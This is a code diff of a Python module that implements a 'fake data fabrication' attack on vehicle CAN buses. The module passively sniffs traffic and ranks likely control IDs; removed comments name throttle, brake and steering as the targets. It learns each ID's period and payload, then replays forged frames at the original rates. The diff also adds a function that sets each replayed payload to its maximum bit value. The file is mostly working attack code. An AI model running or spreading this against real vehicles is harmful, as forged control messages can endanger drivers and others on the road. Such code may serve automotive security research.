@@ -1,12 +1,41 @@
+"""Fake data fabrication (fabrication) attack: learn and replay CAN traffic.
+
+This attack passively observes legitimate CAN messages on the bus to identify
+target control IDs. It then learns their transmission periods and representative
+payloads, and replays them at their original frequencies to masquerade as
+legitimate traffic. The implementation follows a learn-then-replay approach
+inspired by common CAN fabrication attacks.
+"""
 from collections import defaultdict
 from statistics import median
 import time
+
 import can
 
-def identify_signals(bus, observe_time=10.0):
+DEFAULT_OBSERVE_TIME_IDENTIFY = 10.0
+DEFAULT_OBSERVE_TIME_PRIORITY = 5.0
+DEFAULT_OBSERVE_TIME_LEARN = 5.0
+DEFAULT_MAX_DLC = 4
+DEFAULT_MIN_FREQ_HZ = 8.0
+DEFAULT_TOP_N = 10
+DEFAULT_DROP_IDS = (0x611, 0x612, 0x613)
+
+
+def identify_signals(bus, observe_time=DEFAULT_OBSERVE_TIME_IDENTIFY):
     """
-    Observe traffic and flag IDs whose payload bytes change
-    meaningfully — candidates for throttle/brake/steering.
+    Observe traffic and flag IDs whose payload bytes change meaningfully.
+
+    Parameters
+    ----------
+    bus : can.interface.Bus
+        CAN bus instance.
+    observe_time : float, optional
+        Duration to observe traffic for.
+
+    Returns
+    -------
+    None
+        Prints a report of detected signals.
     """
     stats = defaultdict(lambda: {
         "count": 0,
@@ -56,15 +85,34 @@ def identify_signals(bus, observe_time=10.0):
                 )
         print(f"0x{cid:06X} {s['count']:7d} {p:11.2f} {' '.join(changing)}")
 
+
 def identify_priority_packets(
     bus,
-    observe_time=5.0,
-    max_dlc=8,               # set to 4 if you want to be strict
-    min_frequency_hz=8.0,
-    top_n=10,
+    observe_time=DEFAULT_OBSERVE_TIME_PRIORITY,
+    max_dlc=DEFAULT_MAX_DLC,
+    min_frequency_hz=DEFAULT_MIN_FREQ_HZ,
+    top_n=DEFAULT_TOP_N,
 ):
     """
     Return a ranked shortlist of CAN IDs that are small, fast, high-priority.
+
+    Parameters
+    ----------
+    bus : can.interface.Bus
+        CAN bus instance.
+    observe_time : float, optional
+        Duration to observe traffic for.
+    max_dlc : int, optional
+        Maximum DLC to consider.
+    min_frequency_hz : float, optional
+        Minimum frequency threshold.
+    top_n : int, optional
+        Number of top candidates to return.
+
+    Returns
+    -------
+    list[int]
+        List of candidate CAN IDs ranked by score.
     """
     stats = defaultdict(lambda: {
         "count": 0, "last_ts": None, "periods": [], "dlc": None,
@@ -85,7 +133,7 @@ def identify_priority_packets(
 
     candidates = {}
     for cid, s in stats.items():
-        if s["dlc"] is None or s["dlc"] > max_dlc:      # size filter
+        if s["dlc"] is None or s["dlc"] > max_dlc:
             continue
         if len(s["periods"]) < 3:
             continue
@@ -93,7 +141,7 @@ def identify_priority_packets(
         if period <= 0:
             continue
         freq = 1.0 / period
-        if freq < min_frequency_hz:                     # frequency filter
+        if freq < min_frequency_hz:
             continue
         candidates[cid] = {
             "can_id": cid, "dlc": s["dlc"], "count": s["count"],
@@ -107,9 +155,9 @@ def identify_priority_packets(
     max_count = max(c["count"] for c in candidates.values())
     results = []
     for cid, c in candidates.items():
-        dlc_score  = (8 - c["dlc"]) / 8.0               # smaller = better
-        freq_score = c["count"] / max_count             # faster = better
-        prio_score = 1.0 - (cid / 0x7FF)                # lower ID = better
+        dlc_score = (8 - c["dlc"]) / 8.0
+        freq_score = c["count"] / max_count
+        prio_score = 1.0 - (cid / 0x7FF)
         score = 0.3 * dlc_score + 0.4 * freq_score + 0.3 * prio_score
         c["score"] = score
         results.append(c)
@@ -123,15 +171,34 @@ def identify_priority_packets(
           f"{'period(ms)':>11} {'freq(Hz)':>9} {'score':>6}")
     for r in top:
         print(f"0x{r['can_id']:05X} {r['dlc']:4d} {r['count']:7d} "
-              f"{r['period']*1000:11.2f} {r['frequency']:9.1f} "
+              f"{r['period'] * 1000:11.2f} {r['frequency']:9.1f} "
               f"{r['score']:6.3f}")
 
     return [r["can_id"] for r in top]
 
-def learn_targets(bus, target_ids, observe_time=5.0):
+def max_value(data: bytes) -> bytes:
+    value = int.from_bytes(data, byteorder="little")
+    max_val = (1 << value.bit_length()) - 1
+    return max_val.to_bytes(len(data), byteorder="little")
+
+
+def learn_targets(bus, target_ids, observe_time=DEFAULT_OBSERVE_TIME_LEARN):
     """
-    Learn median period + a representative payload for each target ID.
-    Returns {can_id: {'period': float_seconds, 'payload': bytes}}
+    Learn median period and a representative payload for each target ID.
+
+    Parameters
+    ----------
+    bus : can.interface.Bus
+        CAN bus instance.
+    target_ids : iterable[int]
+        Target arbitration IDs to observe.
+    observe_time : float, optional
+        Duration to observe traffic for.
+
+    Returns
+    -------
+    dict
+        Mapping {can_id: {'period': float_seconds, 'payload': bytes}}
     """
     periods = defaultdict(list)
     last_payload = {}
@@ -153,16 +220,28 @@ def learn_targets(bus, target_ids, observe_time=5.0):
         if len(ps) >= 3:
             result[cid] = {
                 "period": median(ps),
-                "payload": last_payload[cid],
+                "payload": max_value(last_payload[cid]),
             }
-            print(f"0x{cid:X}: median period = {median(ps)*1000:.2f} ms "
-                  f"({1/median(ps):.1f} Hz), "
+            print(f"0x{cid:X}: median period = {median(ps) * 1000:.2f} ms "
+                  f"({1 / median(ps):.1f} Hz), "
                   f"payload = {last_payload[cid].hex(' ').upper()}")
     return result
 
-def replay_periodic(bus, targets):
+
+def replay_periodic(bus, targets, progress=None):
     """
-    targets: {can_id: {'period': sec, 'payload': bytes}}
+    Replay learned messages periodically at their original frequencies.
+
+    Parameters
+    ----------
+    bus : can.interface.Bus
+        CAN bus instance.
+    targets : dict
+        Mapping {can_id: {'period': float_seconds, 'payload': bytes}}
+    progress : callable, optional
+        Optional callable ``(sent, rate, msg)`` invoked after sending.
+
+    Runs continuously until interrupted by KeyboardInterrupt.
     """
     tasks = []
     for cid, info in targets.items():
@@ -172,73 +251,107 @@ def replay_periodic(bus, targets):
             is_extended_id=False,
         )
         task = bus.send_periodic(msg, info["period"])
-        tasks.append((cid, task))
-        print(f"Replaying 0x{cid:X} every {info['period']*1000:.2f} ms")
+        tasks.append((cid, task, msg))
+        print(f"Replaying 0x{cid:X} every {info['period'] * 1000:.2f} ms, Payload: {info['payload'].hex(' ').upper()}")
 
+    sent = 0
+    start = time.monotonic()
     try:
-        input("Press Enter to stop replay...\n")
+        while True:
+            time.sleep(1.0)
+            sent += len(tasks)
+            if progress is not None:
+                elapsed = time.monotonic() - start or 1e-9
+                for _, _, msg in tasks:
+                    progress(sent, sent / elapsed, msg)
+                    break
+    except KeyboardInterrupt:
+        print("\nReplay stopped by user.")
     finally:
-        for cid, task in tasks:
-            task.stop()
-        print("Replay stopped.")
+        for _, task, _ in tasks:
+            try:
+                task.stop()
+            except Exception:
+                pass
+        print("Periodic tasks stopped.")
 
-####################################################################
 
-def fake_data_fabrication_func(bus):
+def fake_data_fabrication_func(
+    bus,
+    observe_identify=DEFAULT_OBSERVE_TIME_IDENTIFY,
+    observe_priority=DEFAULT_OBSERVE_TIME_PRIORITY,
+    observe_learn=DEFAULT_OBSERVE_TIME_LEARN,
+    max_dlc=DEFAULT_MAX_DLC,
+    min_freq_hz=DEFAULT_MIN_FREQ_HZ,
+    top_n=DEFAULT_TOP_N,
+    drop_ids=DEFAULT_DROP_IDS,
+    progress=None,
+):
+    """
+    Execute the fake data fabrication attack.
+
+    Learns target IDs from bus traffic, learns their periods and payloads,
+    optionally drops specified IDs, then replays learned messages periodically
+    until interrupted.
+
+    Parameters
+    ----------
+    bus : can.interface.Bus
+        CAN bus instance.
+    observe_identify : float, optional
+        Observation time for signal identification.
+    observe_priority : float, optional
+        Observation time for priority packet identification.
+    observe_learn : float, optional
+        Observation time for learning periods/payloads.
+    max_dlc : int, optional
+        Maximum DLC for candidate filtering.
+    min_freq_hz : float, optional
+        Minimum frequency for candidate filtering.
+    top_n : int, optional
+        Number of top candidates to select.
+    drop_ids : tuple[int], optional
+        IDs to drop from learned targets.
+    progress : callable, optional
+        Optional progress callback for status updates during replay.
+    """
     print("=== Step 1: Auto-identify target IDs ===")
     target_ids = identify_priority_packets(
         bus,
-        observe_time=5.0,
-        max_dlc=4,
-        min_frequency_hz=8.0,
-        top_n=10,
+        observe_time=observe_priority,
+        max_dlc=max_dlc,
+        min_frequency_hz=min_freq_hz,
+        top_n=top_n,
     )
     if not target_ids:
         print("No targets identified — aborting.")
-        bus.shutdown()
+        try:
+            bus.shutdown()
+        except Exception:
+            pass
         return
 
     print(f"\nSelected IDs: {[hex(i) for i in target_ids]}")
 
     print("\n=== Step 2: Learn periods & payloads ===")
-    targets = learn_targets(bus, set(target_ids), observe_time=5.0)
+    targets = learn_targets(bus, set(target_ids), observe_time=observe_learn)
     if not targets:
         print("No target IDs observed during learning — aborting.")
-        bus.shutdown()
+        try:
+            bus.shutdown()
+        except Exception:
+            pass
         return
 
-    # Ajuste Técnico
-    try:
-        targets.pop(int("611", 16))
-        targets.pop(int("612", 16))
-        targets.pop(int("613", 16))
-    except Exception:
-        print("Ajuste técnico não funcinou 100%")
+    for did in drop_ids:
+        try:
+            targets.pop(int(did))
+        except (KeyError, ValueError, TypeError):
+            pass
 
     print("\n=== Step 3: Replay at original frequency ===")
-    replay_periodic(bus, targets)
-
-    bus.shutdown()
-
-'''
-def fake_data_fabrication_func(bus):
-    print("=== Step 1: Identify target IDs ===")
-    target_ids = {
-        0x600,   # ← replace with throttle ID you found
-        0x601,   # ← brake
-        0x602,   # ← steering
-    }
-
-    identify_signals(bus, 5)
-
-    print("=== Step 2: Learn periods & payloads ===")
-    targets = learn_targets(bus, target_ids, observe_time=5.0)
-    if not targets:
-        print("No target IDs observed — check your ID list.")
-        return
-
-    print("=== Step 3: Replay at original frequency ===")
-    replay_periodic(bus, targets)
-
-    bus.shutdown()
-'''
+    replay_periodic(bus, targets, progress=progress)
+    try:
+        bus.shutdown()
+    except Exception:
+        pass
